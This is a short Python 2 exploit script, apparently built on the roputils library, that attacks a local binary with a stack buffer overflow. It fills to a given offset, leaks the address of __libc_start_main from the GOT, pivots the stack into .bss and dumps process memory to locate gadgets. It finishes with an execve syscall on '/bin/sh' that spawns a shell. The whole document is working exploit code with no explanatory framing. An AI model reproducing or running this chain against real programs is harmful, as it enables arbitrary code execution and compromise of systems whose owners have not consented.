from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x400
nr_execve = 59

buf = rop.retfill(offset)
buf += rop.call_chain_ptr(
    ['write', 1, rop.got('__libc_start_main'), 8],
    ['read', 0, addr_stage, 400]
, pivot=addr_stage)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p64()

buf = rop.call_chain_ptr(
    ['write', 1, ref_addr, 0x200000],
    ['read', 0, addr_stage-200, 200]
, pivot=addr_stage-200)
buf += rop.fill(400, buf)

p.write(buf)
data = p.read(0x200000)
print "[+] len(data) = %x" % len(data)
rop.load(data, base=ref_addr)
addr_stage -= 200

buf = rop.syscall(nr_execve, addr_stage+100+16, addr_stage+100, 0)
buf += rop.fill(100, buf)
buf += p64(addr_stage+100+16)
buf += p64(0)
buf += rop.string('/bin/sh')
buf += rop.fill(200, buf)

p.write(buf)
p.wait(0)
